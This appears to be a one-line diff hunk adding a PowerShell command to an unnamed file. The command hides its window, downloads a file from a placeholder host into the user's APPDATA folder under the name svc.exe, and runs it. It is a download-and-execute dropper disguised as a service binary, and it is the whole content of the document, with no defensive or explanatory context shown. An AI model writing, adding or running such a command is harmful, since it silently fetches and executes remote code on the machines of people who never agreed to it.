@@ -1,0 +1,1 @@
+powershell -w hidden -c "iwr https://example.invalid/d -OutFile $env:APPDATA\svc.exe; Start-Process $env:APPDATA\svc.exe"
